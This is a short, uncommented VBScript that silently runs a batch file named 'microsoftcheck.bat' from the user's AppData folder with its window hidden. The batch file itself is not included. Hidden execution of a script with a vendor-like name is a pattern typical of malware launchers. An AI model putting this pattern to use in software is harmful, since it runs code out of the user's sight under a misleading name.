Set WshShell = CreateObject("WScript.Shell")
targetPath = WshShell.ExpandEnvironmentStrings("%appdata%") & "\microsoftcheck.bat"
WshShell.Run Chr(34) & targetPath & Chr(34), 0
Set WshShell = Nothing